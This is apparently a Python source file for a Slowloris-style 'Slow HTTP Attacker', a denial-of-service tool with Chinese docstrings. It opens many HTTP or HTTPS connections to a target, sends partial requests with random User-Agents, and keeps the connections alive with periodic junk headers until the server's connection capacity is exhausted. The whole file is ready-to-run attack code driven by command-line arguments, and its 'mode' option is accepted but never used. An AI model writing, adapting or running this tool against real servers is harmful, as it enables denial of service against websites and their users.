import logging
import random
import socket
import time
import ssl
from args_parser import get_args
from my_socket import MySocket
from user_agents import user_agents


def init_socket(host, port, https, randuseragent):
    """
    初始化一个用于 HTTP/HTTPS 的 socket
    :param host: str, 目标主机
    :param port: int, 目标端口
    :param https: boolean, 是否使用 https
    :param randuseragent: boolean, 是否使用随机 User-Agent
    :return:
    """
    s = MySocket(socket.AF_INET, socket.SOCK_STREAM)
    s.settimeout(4)

    if https:
        s = ssl.wrap_socket(s)

    s.connect((host, port))

    s.send_line(f"GET /?{random.randint(0, 2000)} HTTP/1.1")

    ua = user_agents[0]
    if randuseragent:
        ua = random.choice(user_agents)

    s.send_header("User-Agent", ua)
    s.send_header("Accept-language", "en-US,en,q=0.5")
    return s


def attack(mode, host, port, sockets, sleeptime, https, randuseragent):
    """
    发起攻击
    :param mode: str, 模式，目前支持 "header", "post", "read"
    :param host: str, 目标主机
    :param port: int, 目标端口
    :param sockets: int, 并发数
    :param sleeptime: int, 两次发送以维持 socket 不断开的间隔时间
    :param https: boolean, 是否使用 https
    :param randuseragent: boolean, 是否使用随机 User-Agent
    :return:
    """
    list_of_sockets = []
    ip = host
    socket_count = sockets
    logging.info("Attacking %s with %s sockets.", ip, socket_count)

    logging.info("Creating sockets...")
    for _ in range(socket_count):
        try:
            logging.debug("Creating socket nr %s", _)
            s = init_socket(ip, port, https, randuseragent)
        except socket.error as e:
            logging.debug(e)
            break
        list_of_sockets.append(s)

    while True:
        try:
            logging.info(
                "Sending keep-alive headers... Socket count: %s",
                len(list_of_sockets),
            )
            for s in list(list_of_sockets):
                try:
                    s.send_header("X-a", random.randint(1, 5000))
                except socket.error:
                    list_of_sockets.remove(s)

            logging.debug("Recreating socket...")
            for _ in range(socket_count - len(list_of_sockets)):
                try:
                    s = init_socket(ip, port, https, randuseragent)
                    if s:
                        list_of_sockets.append(s)
                except socket.error as e:
                    logging.debug(e)
                    break
            logging.debug("Sleeping for %d seconds", sleeptime)
            time.sleep(sleeptime)

        except (KeyboardInterrupt, SystemExit):
            logging.info("Stopping Slow HTTP Attacker")
            break


if __name__ == "__main__":
    args = get_args()
    attack(args.mode, args.host, args.port, args.sockets, args.sleeptime, args.https, args.randuseragent)
